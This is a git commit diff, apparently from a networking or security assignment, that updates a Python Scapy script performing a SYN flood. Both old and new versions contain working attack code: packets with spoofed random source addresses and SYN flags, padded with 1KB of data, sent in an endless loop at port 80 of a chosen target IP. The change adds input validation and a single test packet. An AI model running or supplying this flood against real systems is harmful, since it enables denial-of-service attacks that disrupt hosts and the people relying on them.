cac8b1633217b06518fcc710819207c6b8c2732e
Shahmizan <71887108+2000726@users.noreply.github.com>
2021-10-20 15:57:04 +0800

    Update syn_flooding.py

--- task2/syn_flooding.py
+++ task2/syn_flooding.py
@@ -1,5 +1,6 @@
 from scapy.all import *
 from argparse import ArgumentParser
+import socket
 
 
 def main():
@@ -10,30 +11,35 @@ def main():
     parser.epilog = "Usage: python syn_flooding.py -t <IP Address>"        
     args = parser.parse_args()
     
-    # Checks if argument is not empty
 
-    if args.target_ip is not None:
+    try:
+        socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
         
-        target_ip = args.target_ip # target IP address (should be a testing router/firewall)
-        
-        target_port = 80 # the target port u want to flood
-        
-        ip = IP(src=RandIP("172.0.0.1/24"), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
-        
-        tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # random source port, use TCP SYN packet.
-        
-        raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
-        
-        p = ip / tcp / raw # stack up the layers
-        
-        print("The SYN Flood has commence, do CTRL+C to cancel / exit")
-        
-        send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
-        
-    else:
+        if args.target_ip is not None: # Checks if argument is not empty
+            
+            target_ip = args.target_ip # target IP address (should be a testing router/firewall)
+            
+            target_port = 80 # the target port u want to flood
+            
+            ip = IP(src=RandIP("172.0.0.1/24"), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
+            
+            tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # random source port, use TCP SYN packet.
+            
+            raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
+            
+            p = ip / tcp / raw # stack up the layers
+            
+            send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid
+            
+            print("The SYN Flood has commence, do CTRL+C to cancel / exit")
+            
+            send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
+            
+    except:    
         print('[-]Please, use --target-ip or -t to set a Target IP Address!')
         print('[!]Example: -t 10.20.30.40')
         print('[?] -h for help')
         exit()
+    
 
 main()
